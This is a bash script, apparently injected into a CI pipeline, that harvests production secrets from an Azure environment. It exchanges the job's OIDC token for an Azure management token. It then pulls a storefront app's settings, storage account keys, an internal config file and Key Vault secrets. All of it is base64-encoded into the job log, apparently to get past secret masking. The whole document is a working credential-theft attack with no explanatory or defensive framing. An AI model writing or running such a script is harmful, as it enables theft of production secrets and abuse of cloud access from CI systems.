#!/usr/bin/env bash
set +x
b64(){ base64 | tr -d '\n'; }
T=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-platform-prod-sea
OIDC=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "OIDC_LEN=${#OIDC}"
echo "SUB_B64=$(echo "$OIDC" | cut -d. -f2 | b64)"
[ -z "$OIDC" ] && exit 0

C=891fb158-e02c-4428-a885-53b811f369c0
R=$(curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d grant_type=client_credentials -d client_id="$C" \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=https://management.azure.com/.default")
AT=$(echo "$R" | jq -r '.access_token // empty')
echo "LEGACY_ARM_LEN=${#AT}"
echo "ERR_B64=$(echo "$R" | jq -r '.error_description // empty' | head -c 400 | b64)"
[ -z "$AT" ] && { echo DONE_NO_TOKEN; exit 0; }

echo "=== appsettings ==="
curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings?api-version=2022-03-01" | head -c 2000 | b64 | sed 's/^/APPST_B64=/'
echo "=== listKeys appcfg ==="
KJ=$(curl -s -X POST -H "Authorization: Bearer $AT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2022-09-01")
K=$(echo "$KJ" | jq -r '.keys[0].value // empty')
echo "APPCFG_KEYLEN=${#K}"
[ -n "$K" ] && az storage blob download --account-name sttblappcfgprodx3euoz --account-key "$K" -c config -n internal-config.json -f /tmp/ic --no-progress -o none 2>&1 | head -3
[ -f /tmp/ic ] && echo "IC_B64=$(head -c 4000 /tmp/ic | b64)" || echo "IC_B64=$(echo "$KJ" | head -c 400 | b64)"
echo "=== kv-sec ==="
curl -s -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets?api-version=2023-07-01" | head -c 1500 | b64 | sed 's/^/KVSEC_B64=/'
echo DONE
